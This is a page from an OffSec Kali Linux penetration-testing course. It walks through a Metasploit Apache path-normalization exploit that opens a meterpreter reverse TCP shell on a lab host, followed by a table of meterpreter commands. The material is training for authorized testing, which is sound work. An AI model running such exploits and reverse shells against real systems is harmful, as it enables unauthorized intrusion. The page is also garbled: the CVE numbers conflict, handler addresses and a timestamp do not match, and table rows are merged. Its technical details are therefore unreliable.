# OffSec

Penetration Testing with Kali Linux

After selecting the 64-bit non-staged meterpreter_reverse_tcp payload, we review its options. For this particular payload, the same options apply for the previous payloads used.

Now, let's run the exploit module with our Meterpreter payload and we obtain a Meterpreter command prompt, we'll display all commands by entering help.

```
msf6 exploit(multi/http/apache_normalize_path_rce) > run
```

+   [+] Started TCP handler on 192.168.119.44:4444
[+] Using auxiliary/scanner/apache_normalize_path - The target is vulnerable to CVE-2021-12013 (mod_cgi is enabled)
[+] Started 1 of 1 hosts (100% complete)
[+] http://192.168.50.16:80 - Attempt to exploit for CVE-2021-4203
[+] http://192.168.50.16:80 - Sending linux/x64/meterpreter_reverse_tcp command payload
[+] Meterpreter session 4 opened (192.168.119.4:4444 -> 192.168.50.16:35538) at 2022-08-08 05:20:-0400
[-] This exploit may require manual cleanup of '/tmp/GfRglhc' on the target

```
meterpreter > help
```

# Core Commands
===

| Command | Description |
| --- | --- |
| ? | Help menu |
| background | Backgrounds the current session |
| channel close | Displays information or or control active channels Closes a channel |
| info | Displays information about a Post module |
| load | Load one or more meterpreter extensions |
| run secure sessions | Executes a meterpreter script or Post module (Re)Negotiate TLV packet encryption on the session Quickly switch to another session |

# Stdpapi: System Commands
===

| Command | Description |
| --- | --- |
| execute | Execute a command |
| getenv | Get one or more environment variable values |
| getpid | Get the current process identifier |
| getuid | Get the user that the server is running as |
| kill | Terminate a process |

PWK - © 2023 OffSec Services Limited. All rights reserved.

657